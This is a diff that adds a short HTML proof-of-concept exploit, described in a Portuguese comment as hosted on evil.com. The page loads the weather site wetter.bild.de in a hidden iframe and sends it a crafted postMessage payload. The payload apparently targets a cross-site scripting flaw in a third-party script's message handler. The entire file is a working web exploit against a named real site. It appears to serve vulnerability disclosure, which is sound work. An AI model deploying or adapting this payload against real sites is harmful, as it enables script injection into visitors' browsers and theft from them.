@@ -1,0 +1,20 @@
+<!-- exploit.html (hospedado em https://evil.com) -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Exploit PoC</h1>
+    <iframe
+      src="https://wetter.bild.de"
+      id="target"
+      style="width:0;height:0;border:0;display:none"
+    ></iframe>
+
+    <script>
+      const iframe = document.getElementById("target");
+      iframe.onload = () => {
+        // envia a mensagem com origem verdadeira de evil.com
+        iframe.contentWindow.postMessage("Kameleoonalert(document.domain)", "https://wetter.bild.de");
+      };
+    </script>
+  </body>
+</html>
